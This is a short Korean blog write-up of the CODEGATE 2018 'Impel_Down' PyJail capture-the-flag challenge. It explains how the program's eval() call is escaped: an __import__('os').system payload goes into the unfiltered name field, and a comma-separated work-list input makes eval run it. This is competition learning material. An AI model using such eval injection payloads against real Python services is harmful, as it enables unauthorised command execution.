---
layout: post
title:  "CODEGATE 2018 Impel_Down Writeup"
date:   2018-02-12 05:45:13 -0400
categories: ctf
---

### Impel Down
nc로 문제에 접속해보면 PyJail이라는 프로그램이 실행된다. 프로그램명처럼 이 프로그램을 벗어나면(?) 문제를 풀 수 있을 것 같다.
맨처음에 아무거나 입력했는데 에러 메세지가 출력된다.

```[day-1]
################## Work List ##################
  coworker        : Find Coworker For Escape
  tool            : Find Any Tool
  dig             : Go Deep~
  bomb            : make boooooooomb!!!
###############################################
dig | a
Traceback (most recent call last):
  File "Impel_Down.py", line 140, in <module>
    result = eval("your."+work+"()")
  File "<string>", line 1, in <module>
NameError: name 'a' is not defined
```

eval() 함수에서 에러가 발생했다. 이를 통해 원하는 코드를 실행할 수 있을 거라고 생각했다. 
여러가지 입력해보니깐 문자열의 입력길이도 제한이 있고 #, +, _ 같은 문자도 필터링한다. 하지만 이름을 입력하는 곳에선 이러한 제약이 없다.
그래서 이름엔 "\_\_import\_\_('os').system('Command')", Work List엔 "dig,eval(name),your.dig"와 같은 식으로 입력하면 원하는 코드를 실행할 수 있다.

> eval() 함수가 여러 연산을 리턴하는 걸 몰랐었다... (ex. eval("1+1, 2-1") ==> (2,1))
